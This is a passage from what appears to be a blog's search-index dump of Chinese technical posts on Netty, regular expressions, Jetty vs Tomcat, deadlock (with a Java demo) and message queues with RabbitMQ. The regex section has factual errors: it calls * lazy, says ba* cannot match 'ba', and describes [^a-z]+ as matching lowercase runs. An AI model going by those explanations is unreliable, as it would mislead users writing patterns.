I/O，非阻塞IO）开发的网络通信框架，对比于BIO（Blocking I/O，阻塞IO），他的并发性能得到了很大提高，用于快速开发可维护的高性能协议服务器和客户端。 JDK原生NIO程序的问题JDK原生也有一套网络应用程序API，但是存在一系列问题，主要如下： NIO的类库和API繁杂，使用麻烦，你需要熟练掌握Selector、ServerSocketChannel、SocketChannel、ByteBuffer等； 需要具备其它的额外技能做铺垫，例如熟悉Java多线程编程，因为NIO编程涉及到Reactor模式，你必须对多线程和网路编程非常熟悉，才能编写出高质量的NIO程序； 可靠性能力补齐，开发工作量和难度都非常大。例如客户端面临断连重连、网络闪断、半包读写、失败缓存、网络拥塞和异常码流的处理等等，NIO编程的特点是功能开发相对容易，但是可靠性能力补齐工作量和难度都非常大； JDK NIO 的 Bug：例如臭名昭著的 Epoll Bug，它会导致 Selector 空轮询，最终导致 CPU 100%。官方声称在 JDK 1.6 版本的 update 18 修复了该问题，但是直到 JDK 1.7 版本该问题仍旧存在，只不过该 Bug 发生概率降低了一些而已，它并没有被根本解决。 Netty 的特点Netty 对 JDK 自带的 NIO 的 API 进行了封装，解决了上述问题。Netty的主要特点有： 设计优雅：适用于各种传输类型的统一 API 阻塞和非阻塞 Socket；基于灵活且可扩展的事件模型，可以清晰地分离关注点；高度可定制的线程模型 - 单线程，一个或多个线程池；真正的无连接数据报套接字支持（自 3.1 起）。 使用方便：详细记录的 Javadoc，用户指南和示例；没有其他依赖项，JDK 5（Netty 3.x）或 6（Netty 4.x）就足够了。 高性能、吞吐量更高：延迟更低；减少资源消耗；最小化不必要的内存复制。 安全：完整的 SSL/TLS 和 StartTLS 支持。5）社区活跃、不断更新： 社区活跃，版本迭代周期短，发现的 Bug 可以被及时修复，同时，更多的新功能会被加入。 Netty 常见使用场景互联网行业典型的应用有：阿里分布式服务框架Dubbo的RPC框架使用Dubbo协议进行节点间通信，Dubbo协议默认使用Netty作为基础通信组件，用于实现各进程节点之间的内部通信。 游戏行业无论是手游服务端还是大型的网络游戏，Java语言得到了越来越广泛的应用。Netty作为高性能的基础通信组件，它本身提供了TCP/UDP和HTTP协议栈。 非常方便定制和开发私有协议栈，账号登录服务器，地图服务器之间可以方便的通过Netty进行高性能的通信 大数据领域经典的Hadoop的高性能通信和序列化组件Avro的RPC框架，默认采用Netty进行跨界点通信，它的Netty Service基于Netty框架二次封装实现 Reference 再有人问你Netty是什么，就把这篇文章发给他 - https://yq.aliyun.com/articles/673437 新手入门：目前为止最透彻的的Netty高性能原理和框架架构解析 - http://www.52im.net/thread-2043-1-1.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"},{"name":"NetworkProgramming","slug":"Java/NetworkProgramming","permalink":"http://swsmile.info/categories/Java/NetworkProgramming/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"},{"name":"Network Programming","slug":"Network-Programming","permalink":"http://swsmile.info/tags/Network-Programming/"}]},{"title":"【Regular Expression】正则表达式（Regular Expression）","date":"2019-07-10T07:27:39.000Z","path":"2019/07/10/【Regular-Expression】正则表达式/","text":"非打印字符非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列： 字符 描述 \\cx 匹配由x指明的控制字符。例如， \\cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \\f 匹配一个换页符。等价于 \\x0c 和 \\cL。 \\n 匹配一个换行符。等价于 \\x0a 和 \\cJ。 \\r 匹配一个回车符。等价于 \\x0d 和 \\cM。 \\s 匹配任何空白字符，包括空格（space）、制表符（tab）、换页符（newline）等等。等价于 [\\f\\n\\r\\t\\v]。注意 Unicode 正则表达式会匹配全角空格符。 \\S 匹配任何非空白字符，即除空格（space）、制表符（tab）、换页符（newline）之外的任何字符。等价于 [^\\f\\n\\r\\t\\v]。 \\t 匹配一个制表符。等价于 \\x09 和 \\cI。 \\v 匹配一个垂直制表符。等价于 \\x0b 和 \\cK。 \\0 Matches a null character, most often visually represented in unicode using U+2400. 特殊字符所谓特殊字符，就是一些有特殊含义的字符，如runoo*b 中的 *，简单的说就是表示任何字符串的意思。如果要查找字符串中的 * 符号，则需要对 * 进行转义，即在其前加一个 \\ 变成 \\* ， runo\\*ob 匹配 runo*ob。 许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\\ 放在它们前面。下表列出了正则表达式中的特殊字符： 特别字符 描述 $ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则也匹配 ‘\\n’ 或 ‘\\r’。要匹配 $ 字符本身，请使用 ·\\$。 ( ) 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 \\( 和 \\)。 * 匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \\*。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \\+。 . 匹配除换行符 \\n 之外的任何单个字符（这个字符的长度为 1）。要匹配 . ，请使用 \\. 。 [ 标记一个中括号表达式的开始。要匹配 [，请使用 \\[。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \\?。 \\ 将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\\n’ 匹配换行符。序列 ‘\\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。 ^ 匹配输入字符串的开始位置。如果在方括号表达式中使用，则表示不接受该字符集合（比如，[^a-z] 表示匹配在 a - z 范围外的一个字符）。要匹配 ^ 字符本身，请使用\\^。 { 标记限定符表达式的开始。要匹配 {，请使用 \\{。 | 指明两项之间的一个选择。要匹配 |，请使用 |。 限定符（Quantifier）限定符（Quantifier）用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 *** 或 **+ 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于 {0,}。 + 匹配前面的子表达式一次或多次。例如，zo+ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，do(es)? 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，o{2} 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，o{2,‘ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。o{1,} 等价于 o+。o{0,} 则等价于 o*。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，o{1,3} 将匹配 fooooood 中的前三个 o。o{0,1}&#39; 等价于 o?。请注意在逗号和两个数之间不能有空格。 Meta Sequences 字符 描述 . Matches any character other than newline (or including newline with the /s flag) \\d Matches any decimal digit. Equivalent to [0-9]. \\D Matches anything other than a decimal digit. \\w Matches any letter, digit or underscore. Equivalent to [a-zA-Z0-9_]. \\W Matches anything other than a letter, digit or underscore. Flags/Modifiers 字符 描述 g Tells the engine not to stop after the first match has been found, but rather to continue until no more matches can be found. m Multiline, the ^ and $ anchors now match at the beginning/end of each line respectively, instead of beginning/end of the entire string. 一些实例Case 1 - 匹配单个字符例子 1 - 匹配单个指定字符Pattern: 1/3/ 表示匹配任何为“3”的字符。 比如，input为： 121233345 匹配到了三次。 例子 1 - 匹配单个的任意字符Pattern: 1/.+/ 表示匹配长度尽可能长的一个字符串。 比如，input为： 12line1 line2 匹配到了两次。 Case 2 - [Character Set] 匹配在给定字符集合中的字符 - [&lt;character_candidate&gt;...]匹配一个字符 [abc]：匹配一个字符，且这个字符必须是 a，b 或 c [^abc]：匹配除了 a，b 和 c 之外的一个字符 [a-z]：匹配在 a - z 范围内的一个字符 [^a-z]：匹配在 a - z 范围外的一个字符 [a-zA-Z]：匹配在 a - z 或 A - Z范围内的一个字符 [\\u4e00-\\u9fa5]：匹配一个中文字符。 匹配一个字符串(包含1个或多个字符） [0-9]+：匹配包含一个或多个数字的一个字符串（ [0-9] 匹配单个数字，+ 匹配一个或者多个） 注意，如果要匹配 ^ 字符本身，请使用\\^。 例子 1 - 匹配范围内的一个数字Pattern: 1/[0-9]/ 表示匹配任何为数字（0，1，…9）的一个字符。 比如，input为： 匹配到了五次。 例子 2 - 匹配范围内的一个小写字母类似地， Pattern: 1/[a-z]/ 表示匹配任何为小写字母（a，b，…z）的一个字符。 比如，input为： 匹配到了四次。 例子 3 - 匹配一个中文字符Pattern: 1/[\\u4e00-\\u9fa5]/ 表示匹配任何一个中文字符。 比如，input为： 1Anything but 中文啊 匹配到了三次。 例子 4 - 匹配范围内的一个小写或大写字母Pattern: 1/[a-zA-Z]/ 表示匹配任何为小写或大写字母（a，A，b，B…z，Z）的一个字符。 比如，input为： 1abc123DEF 匹配到了六次。 例子 5 - 匹配一个非小写字母字符Pattern: 1/[^a-z]/ 表示匹配任何为非小写字母（a，b，…z）的一个字符。 比如，input为： 1Anything but a-z. 匹配到了五次。 例子 6 - 匹配多个连续的小写字母字符串Pattern: 1/[^a-z]+/ 表示匹配任何每个字符均为小写字母（a，b，…z）的一个字符串。 比如，input为： 1Anything but a -z.... 匹配到了五次。 Case 3 - [Quantifier] 指定匹配字符串的匹配长度 - {&lt;minimum_match_times&gt;,[&lt;maximum_match_times&gt;]}其实我们提到了，限定符（Quantifier）用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 *** 或 **+ 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次（尽可能少的匹配，懒惰策略）。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于 {0,}。 + 匹配前面的子表达式一次或多次（尽可能多的匹配，贪心策略）。例如，zo+ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次（尽可能多的匹配，贪心策略）。例如，do(es)? 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，o{2} 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，o{2,‘ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。o{1,} 等价于 o+。o{0,} 则等价于 o*。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，o{1,3} 将匹配 fooooood 中的前三个 o。o{0,1}&#39; 等价于 o?。请注意在逗号和两个数之间不能有空格。 例子 1 - 匹配0个或一个 a - ?（贪心策略）Pattern: 1/a?/ 表示匹配的包含0个或1个 a 的一个字符。 比如，input为： 1abca 匹配到了五次，其中匹配到了包含0个字符长度的字符三次。 例子 2 - 匹配0个或多个 a - *（懒惰策略）Pattern: 1/ba*/ 表示匹配包含一个 b， 紧接着包含0个或多个 a 的一个字符串。 比如，input为： 1a ba baa aaa ba b 匹配到了四次，可以发现，由于 * 是采用贪心匹配的原则（即当匹配到了一个 b 之后，尽量少的匹配到 a ），所以永远不会匹配到 ba（因为当匹配到 b 之后，已经满足匹配 pattern了）。 例子 3 - 匹配1个或多个 a - +（贪心策略）Pattern: 1/ba*/ 表示匹配包含一个 b， 紧接着包含0个或多个 a 的一个字符串。 比如，input为： 1a ba baa aaa ba b 匹配到了三次。 例子 4 - 匹配3个连续的 a - {&lt;match_times&gt;}Pattern: 1/a&#123;3&#125;/ 比如，input为： 1a aa aaa aaaa 匹配到了四次。 例子 5 - 匹配包含3个以上连续的 a 的字符串 - {&lt;min_match_times&gt;,}Pattern: 1/a&#123;3,&#125;/ 比如，input为： 1a aa aaa aaaa aaaaaa 匹配到了三次。 Case 4 - 匹配开头或结尾字符例子 1 - 匹配开头的第一个单词 Pattern: 1/^\\w+/ 注意，\\w 的含义是匹配任何英文字母、数字或者下划线（underscore），等价于 [a-zA-Z0-9_]。 比如，input为： 1start of string 匹配到了一次。 例子 2 - 匹配结尾的最后一个单词 Pattern: 1/\\w+$/ 比如，input为： 1end of string 匹配到了一次。 Case 5 - 混合使用Reference https://regex101.com/ https://regexr.com/ 正则表达式 - 教程 - http://www.runoob.com/regexp/regexp-metachar.html 正则表达式之任意字符 - https://www.w3cschool.cn/regexp/1ngu1pqi.html","comments":true,"categories":[{"name":"RegularExpression","slug":"RegularExpression","permalink":"http://swsmile.info/categories/RegularExpression/"}],"tags":[{"name":"Regular Expression","slug":"Regular-Expression","permalink":"http://swsmile.info/tags/Regular-Expression/"}]},{"title":"【Java EE】Jetty入门","date":"2019-07-10T05:27:53.000Z","path":"2019/07/10/【JavaEE】Jetty入门/","text":"Jetty总的来说，Jetty是一个Servlet container，可以看做是Tomcat的替代品。 与 Tomcat 的比较Tomcat 和 Jetty 都是作为一个 Servlet 引擎应用的比较广泛，可以将它们比作为中国与美国的关系，虽然 Jetty 正常成长为一个优秀的 Servlet 引擎，但是目前的 Tomcat 的地位仍然难以撼动。相比较来看，它们都有各自的优点与缺点。 Tomcat 经过长时间的发展，它已经广泛的被市场接受和认可，相对 Jetty 来说 Tomcat 还是比较稳定和成熟，尤其在企业级应用方面，Tomcat 仍然是第一选择。但是随着 Jetty 的发展，Jetty 的市场份额也在不断提高，至于原因就要归功与 Jetty 的很多优点了，而这些优点也是因为 Jetty 在技术上的优势体现出来的。 Jetty Vs TomcatTomcat作为第一款成功的Web容器，具有广大的用户群体。从表面功能上Jetty和Tomcat都是差不多的，都提供Http Server和Servlet容器功能，下面我们从几个方面比较两者的差异： 从构架方面Tomcat主要是作为JSP/Servlet最新规范的参考实现而设计，属于学院派，但是显得庞大而杂乱。最常见的Tomcat使用方式是将其作为一个服务器软件安装到操作系统上，然后在里面部署web应用，如果嵌入到其他JEE服务器中以提供Web容器功能或者作为组件嵌入到其他应用中，操作起来比较麻烦。 Jetty是由多个可以独立运行的构件通过彼此之间可插拔的接口组装在一起，其使用可以非常灵活。目前，Jetty在Geronimo、JBoss、Sybase EAServer、JOnAS和Glassfish等Java EE应用服务器中提供Web容器功能。 从性能方面Tomcat在耗时请求连接数量不多时，也就是大多数请求能非常短的时间处理完毕的情况下，具有较好的执行效率。 Jetty 在存在大量并发连接，大多数连接又需要更多的处理时间（业务逻辑计算占用的时间）的情况下（这种情况是目前大多数web应用具有的特点），具有更好的性能和伸缩性。Jetty的这个优势得益于Continuation机制，这样可以把有限的内存资源更多的留给应用程序使用。在静态文件服务方面，Jetty 也具有更好的性能。这是由于Jetty使用了文件内存映射机制和NIO来对静态内容进行输入输出，这种方式将占用更少的系统内存和更快发送速度。 从标准规范方面Tomcat曾是sevlet2.4规范的参考实现，从Servlet2.5之后，Tomcat不再是参考实现了，Sun公司自己创建了Glassfish，并作为Servlet2.5、Servlet3.0、Jsp2.1的参考实现。 Jetty在执行规范方面做的非常好，是Servlet2.5规范的一个优秀实现。在Servlet3.0中，Jetty自有的continuation机制也成为规范备选方案之一。 Reference Jetty 的工作原理以及与 Tomcat 的比较 - https://www.ibm.com/developerworks/cn/java/j-lo-jetty/index.html","comments":true,"categories":[{"name":"JavaEE","slug":"JavaEE","permalink":"http://swsmile.info/categories/JavaEE/"}],"tags":[{"name":"Java EE","slug":"Java-EE","permalink":"http://swsmile.info/tags/Java-EE/"}]},{"title":"【Operating System】死锁（deadlock）","date":"2019-07-10T05:20:15.000Z","path":"2019/07/10/【Operating-System】死锁/","text":"死锁（deadlock）死锁（deadlock），是指两个或两个以上的线程或进程。因争夺资源而造成的互相等待的现象。若无外力作用，他们都将无法推进下去，此时称系统处于死锁状态或产生了死锁，这些永远互相等待的进程称之为死锁进程、线程。 死锁例子当线程A持有独占锁a，并尝试去获取独占锁b的同时，线程B持有独占锁b，并尝试获取独占锁a的情况下，就会发生AB两个线程由于互相持有对方需要的锁，而发生的阻塞现象，我们称为死锁。 下面用一个非常简单的死锁示例来帮助你理解死锁的定义： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class DeadLockDemo &#123; public static void main(String[] args) &#123; // 线程a Thread td1 = new Thread(new Runnable() &#123; public void run() &#123; DeadLockDemo.method1(); &#125; &#125;); // 线程b Thread td2 = new Thread(new Runnable() &#123; public void run() &#123; DeadLockDemo.method2(); &#125; &#125;); td1.start(); td2.start(); &#125; public static void method1() &#123; synchronized (String.class) &#123; try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"线程a尝试获取integer.class\"); synchronized (Integer.class) &#123; &#125; &#125; &#125; public static void method2() &#123; synchronized (Integer.class) &#123; try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"线程b尝试获取String.class\"); synchronized (String.class) &#123; &#125; &#125; &#125;&#125; 输出： 1234567线程b尝试获取String.class线程a尝试获取integer.class..........无限阻塞下去 产生死锁的四个必要条件只要系统产生死锁，这四个条件必然成立，只要上述条件之一不满足，就不会发生死锁： 互斥条件即某个资源在一段时间内只能由一个进程占有，不能同时被两个或两个以上的进程占有。这种独占资源如CD-ROM驱动器，打印机等等，必须在占有该资源的进程主动释放它之后，其它进程才能占有该资源。这是由资源本身的属性所决定的。如独木桥就是一种独占资源，两方的人不能同时过桥。 不可抢占条件进程所获得的资源在未使用完毕之前，资源申请者不能强行地从资源占有者手中夺取资源，而只能由该资源的占有者进程自行释放。如过独木桥的人不能强迫对方后退，也不能非法地将对方推下桥，必须是桥上的人自己过桥后空出桥面（即主动释放占有资源），对方的人才能过桥。 不剥夺条件进程至少已经占有一个资源，但又申请新的资源；由于该资源已被另外进程占有，此时该进程阻塞；但是，它在等待新资源之时，仍继续占用已占有的资源。 还以过独木桥为例，甲乙两人在桥上相遇。甲走过一段桥面（即占有了一些资源），还需要走其余的桥面（申请新的资源），但那部分桥面被乙占有（乙走过一段桥面）。甲过不去，前进不能，又不后退；乙也处于同样的状况。 循环等待条件存在一个进程等待序列{P1，P2，…，Pn}，其中P1等待P2所占有的某一资源，P2等待P3所占有的某一源，……，而Pn等待P1所占有的的某一资源，形成一个进程循环等待环。就像过独木桥问题，甲等待乙占有的桥面，而乙又等待甲占有的桥面，从而彼此循环等待。 上面我们提到的这四个条件在死锁时会同时发生。也就是说，只要有一个必要条件不满足，则死锁就可以排除。 解决死锁的四种方式（静态的死锁预防）死锁的预防是保证系统在任何时刻都不进入死锁状态的一种策略。它的基本思想是要求进程申请资源时遵循某种协议，从而打破产生死锁的四个必要条件中的一个或几个，保证系统不会进入死锁状态。 打破互斥条件即允许进程同时访问某些资源。但是，有的资源是不允许被同时访问的，像打印机等等，这是由资源本身的属性所决定的。所以，这种办法并无实用价值。 打破不可抢占条件即允许进程强行从占有者那里夺取某些资源。就是说，当一个进程已占有了某些资源，它又申请新的资源，但不能立即被满足时，它必须释放所占有的全部资源，以后再重新申请。它所释放的资源可以分配给其它进程。这就相当于该进程占有的资源被隐蔽地强占了。这种预防死锁的方法实现起来困难，会降低系统性能。 打破占有且申请条件 - 预先分配策略可以实行资源预先分配策略。即进程在运行前一次性地向系统申请它所需要的全部资源。 如果某个进程所需的全部资源得不到满足，则不分配任何资源，此进程暂不运行。只有当系统能够满足当前进程的全部资源需求时，才一次性地将所申请的资源全部分配给该进程。由于运行的进程已占有了它所需的全部资源，所以不会发生占有资源又申请资源的现象，因此不会发生死锁。 但是，这种策略也有如下缺点： 在许多情况下，一个进程在执行之前不可能知道它所需要的全部资源。这是由于进程在执行时是动态的，不可预测的； 资源利用率低。无论所分资源何时用到，一个进程只有在占有所需的全部资源后才能执行。即使有些资源最后才被该进程用到一次，但该进程在生存期间却一直占有它们，造成长期占着不用的状况。这显然是一种极大的资源浪费； 降低了进程的并发性。因为资源有限，又加上存在浪费，能分配到所需全部资源的进程个数就必然少了。 打破循环等待条件 - 有序分配策略实行资源有序分配策略。采用这种策略，即把资源事先分类编号，按号分配，使进程在申请，占用资源时不会形成环路。所有进程对资源的请求必须严格按资源序号递增的顺序提出。进程占用了小号资源，才能申请大号资源，就不会产生环路，从而预防了死锁。这种策略与前面的策略相比，资源的利用率和系统吞吐量都有很大提高，但是也存在以下缺点： 限制了进程对资源的请求，同时给系统中所有资源合理编号也是件困难事，并增加了系统开销； 为了遵循按编号申请的次序，暂不使用的资源也需要提前申请，从而增加了进程对资源的占用时间。 ​ 死锁的检测+恢复（动态的死锁避免）死锁的检测+恢复（动态的死锁避免），是相对于静态的死锁预防的。 静态的死锁预防保证，在任意时刻，系统都不进入死锁状态，它的基本思想是要求进程申请资源时遵循某种协议，从而打破产生死锁的四个必要条件中的一个或几个，以保证系统不会进入死锁状态。 而死锁的检测+恢复，我们允许死锁状态的短暂存在，但是通过死锁检测机制，在检测到死锁后，对其进行恢复。 哲学家就餐问题银行家算法一个银行家如何将一定数目的资金安全地借给若干个客户，使这些客户既能借到钱完成要干的事，同时银行家又能收回全部资金而不至于破产。银行家就像一个操作系统，客户就像运行的进程，银行家的资金就是系统的资源。 银行家算法需要确保以下四点： 当一个顾客对资金的最大需求量不超过银行家现有的资金时就可接纳该顾客； 顾客可以分期贷款, 但贷款的总数不能超过最大需求量； 当银行家现有的资金不能满足顾客尚需的贷款数额时，对顾客的贷款可推迟支付，但总能使顾客在有限的时间里得到贷款； 当顾客得到所需的全部资金后，一定能在有限的时间里归还所有的资金。 Reference 死锁是什么？如何避免死锁？ - https://www.jianshu.com/p/44125bb12ebf Java 程序死锁问题原理及解决方案 - https://www.ibm.com/developerworks/cn/java/j-lo-deadlock/index.html 死锁问题分析 - https://juejin.im/entry/593e5db6ac502e006c0d6264","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Distributed System】消息队列（Message Queue）","date":"2019-07-10T04:58:58.000Z","path":"2019/07/10/【Distributed-System】消息队列/","text":"什么是消息队列（Message Queue）我们可以把消息队列比作是一个存放消息的容器，当我们需要使用消息的时候可以取出消息供自己使用。消息队列是分布式系统中重要的组件，使用消息队列主要是为了通过异步处理提高系统性能和削峰、降低系统耦合性。目前使用较多的消息队列有ActiveMQ，RabbitMQ，Kafka，RocketMQ。 另外，我们知道队列 Queue 是一种先进先出的数据结构，所以消费消息时也是按照顺序来消费的。比如生产者发送消息1,2,3…对于消费者就会按照1,2,3…的顺序来消费。但是偶尔也会出现消息被消费的顺序不对的情况，比如某个消息消费失败又或者一个 queue 多个consumer 也会导致消息被消费的顺序不对，我们一定要保证消息被消费的顺序正确。 除了上面说的消息消费顺序的问题，使用消息队列，我们还要考虑如何保证消息不被重复消费？如何保证消息的可靠性传输（如何处理消息丢失的问题）？等等问题。所以说使用消息队列也不是十全十美的，使用它也会让系统可用性降低、复杂度提高，另外需要我们保障一致性等问题。 为什么要用消息队列使用消息队列主要有两点好处： 通过异步处理提高系统性能（削峰、减少响应所需时间）； 降低系统耦合性。 1 异步处理提高系统性能 如上图，在不使用消息队列服务器的时候，用户的请求数据直接写入数据库，在高并发的情况下数据库压力剧增，使得响应速度变慢。但是在使用消息队列之后，用户的请求数据发送给消息队列之后立即返回，再由消息队列的消费者进程从消息队列中获取数据，异步写入数据库。由于消息队列服务器处理速度快于数据库（消息队列也比数据库有更好的伸缩性），因此响应速度得到大幅改善。 例子 1 - 削峰通过以上分析我们可以得出消息队列具有很好的削峰作用的功能——即通过异步处理，将短时间高并发产生的事务消息存储在消息队列中，从而削平高峰期的并发事务。 举例：在电子商务一些秒杀、促销活动中，合理使用消息队列可以有效抵御促销活动刚开始大量订单涌入对系统的冲击。如下图所示： 因为用户请求数据写入消息队列之后就立即返回给用户了，但是请求数据在后续的业务校验、写数据库等操作中可能失败。 因此使用消息队列进行异步处理之后，需要适当修改业务流程进行配合，比如用户在提交订单之后，订单数据写入消息队列，不能立即返回用户订单提交成功，需要在消息队列的订单消费者进程真正处理完该订单之后，甚至出库后，再通过电子邮件或短信通知用户订单成功，以免交易纠纷。这就类似我们平时手机订火车票和电影票。 例子 2 - 减少响应所需时间我们通过实际案例说明：假设A系统接收一个请求，需要在自己本地写库执行SQL，然后需要调用BCD三个系统的接口。 假设自己本地写库要3ms，调用BCD三个系统分别要300ms、450ms、200ms。 那么最终请求总延时是3 + 300 + 450 + 200 = 953ms，接近1s，可能用户会感觉太慢了。 此时整个系统大概是这样的： 但是一旦使用了MQ之后，系统A只需要发送3条消息到MQ中的3个消息队列，然后就返回给用户了。 假设发送消息到MQ中耗时20ms，那么用户感知到这个接口的耗时仅仅是20 + 3 = 23ms，用户几乎无感知，倍儿爽！ 此时整个系统结构大概是这样的： 可以看到，通过MQ的异步功能，可以大大提高接口的性能。 2 降低系统耦合性我们知道如果模块之间不存在直接调用，那么新增模块或者修改模块就对其他模块影响较小，这样系统的可扩展性无疑更好一些。 我们最常见的事件驱动架构（Event-driven architecture）类似生产者消费者模式，在大型网站中通常用利用消息队列实现事件驱动结构 消息队列使利用发布-订阅模式工作，消息发送者（生产者）发布消息，一个或多个消息接受者（消费者）订阅消息。 从上图可以看到消息发送者（生产者）和消息接受者（消费者）之间没有直接耦合，消息发送者将消息发送至分布式消息队列即结束对消息的处理，消息接受者从分布式消息队列获取该消息后进行后续处理，并不需要知道该消息从何而来。对新增业务，只要对该类消息感兴趣，即可订阅该消息，对原有系统和业务没有任何影响，从而实现网站业务的可扩展性设计。 消息接受者对消息进行过滤、处理、包装后，构造成一个新的消息类型，将消息继续发送出去，等待其他消息接受者订阅该消息。因此基于事件（消息对象）驱动的业务架构可以是一系列流程。 另外为了避免消息队列服务器宕机造成消息丢失，会将成功发送到消息队列的消息存储在消息生产者服务器上，等消息真正被消费者服务器处理后才删除消息。在消息队列服务器宕机后，生产者服务器会选择分布式消息队列服务器集群中的其他服务器发布消息。 备注： 不要认为消息队列只能利用发布-订阅模式工作，只不过在解耦这个特定业务环境下是使用发布-订阅模式的。除了发布-订阅模式，还有点对点订阅模式（一个消息只有一个消费者），我们比较常用的是发布-订阅模式。 另外，这两种消息模型是 JMS 提供的，AMQP 协议还提供了 5 种消息模型。 使用消息队列带来的一些问题系统可用性降低系统可用性在某种程度上降低，为什么这样说呢？在加入MQ之前，你不用考虑消息丢失或者说MQ挂掉等等的情况，但是，引入MQ之后你就需要去考虑了！ 系统复杂性提高加入MQ之后，你需要保证消息没有被重复消费、处理消息丢失的情况、保证消息传递的顺序性等等问题！ 保证MQ消息不丢失？使用了MQ之后，还要关心消息丢失的问题。这里我们挑RabbitMQ来说明一下吧。 生产者弄丢了数据RabbitMQ生产者将数据发送到rabbitmq的时候,可能数据在网络传输中搞丢了，这个时候RabbitMQ收不到消息，消息就丢了。 RabbitMQ提供了两种方式来解决这个问题： 事务方式： 在生产者发送消息之前，通过channel.txSelect开启一个事务，接着发送消息 如果消息没有成功被RabbitMQ接收到，生产者会收到异常，此时就可以进行事务回滚channel.txRollback然后重新发送。假如RabbitMQ收到了这个消息，就可以提交事务channel.txCommit。 但是这样一来，生产者的吞吐量和性能都会降低很多，现在一般不这么干。 另外一种方式就是通过confirm机制： 这个confirm模式是在生产者哪里设置的，就是每次写消息的时候会分配一个唯一的id，然后RabbitMQ收到之后会回传一个ack，告诉生产者这个消息ok了。 如果rabbitmq没有处理到这个消息，那么就回调一个nack的接口，这个时候生产者就可以重发。 事务机制和cnofirm机制最大的不同在于事务机制是同步的，提交一个事务之后会阻塞在那儿 但是confirm机制是异步的，发送一个消息之后就可以发送下一个消息，然后那个消息rabbitmq接收了之后会异步回调你一个接口通知你这个消息接收到了。 所以一般在生产者这块避免数据丢失，都是用confirm机制的。 Rabbitmq弄丢了数据RabbitMQ集群也会弄丢消息，这个问题在官方文档的教程中也提到过，就是说在消息发送到RabbitMQ之后，默认是没有落地磁盘的，万一RabbitMQ宕机了，这个时候消息就丢失了。 所以为了解决这个问题，RabbitMQ提供了一个持久化的机制，消息写入之后会持久化到磁盘 这样哪怕是宕机了，恢复之后也会自动恢复之前存储的数据，这样的机制可以确保消息不会丢失。 设置持久化有两个步骤： 第一个是创建queue的时候将其设置为持久化的，这样就可以保证rabbitmq持久化queue的元数据，但是不会持久化queue里的数据 第二个是发送消息的时候将消息的deliveryMode设置为2，就是将消息设置为持久化的，此时rabbitmq就会将消息持久化到磁盘上去。 但是这样一来可能会有人说：万一消息发送到RabbitMQ之后，还没来得及持久化到磁盘就挂掉了，数据也丢失了，怎么办？ 对于这个问题，其实是配合上面的confirm机制一起来保证的，就是在消息持久化到磁盘之后才会给生产者发送ack消息。 万一真的遇到了那种极端的情况，生产者是可以感知到的，此时生产者可以通过重试发送消息给别的RabbitMQ节点 消费端弄丢了数据RabbitMQ消费端弄丢了数据的情况是这样的：在消费消息的时候，刚拿到消息，结果进程挂了，这个时候RabbitMQ就会认为你已经消费成功了，这条数据就丢了。 对于这个问题，要先说明一下RabbitMQ消费消息的机制：在消费者收到消息的时候，会发送一个ack给RabbitMQ，告诉RabbitMQ这条消息被消费到了，这样RabbitMQ就会把消息删除。 但是默认情况下这个发送ack的操作是自动提交的，也就是说消费者一收到这个消息就会自动返回ack给RabbitMQ，所以会出现丢消息的问题。 所以针对这个问题的解决方案就是：关闭RabbitMQ消费者的自动提交ack,在消费者处理完这条消息之后再手动提交ack。 这样即使遇到了上面的情况，RabbitMQ也不会把这条消息删除，会在你程序重启之后，重新下发这条消息过来。 